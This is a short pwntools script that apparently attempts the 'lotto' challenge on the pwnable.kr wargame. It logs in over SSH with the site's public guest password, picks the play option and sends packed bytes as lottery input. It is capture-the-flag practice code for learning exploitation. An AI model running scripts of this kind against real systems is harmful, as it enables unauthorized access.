from pwn import *

s = ssh("lotto", "pwnable.kr", port=2222, password='guest')

p = s.process('./lotto')

print(p.readline().decode())

p.sendline('1'.encode())

print(p.recvuntil(b'Exit\n').decode())

p.sendline(p64(123456))

print(p.recvuntil(b'Exit\n').decode())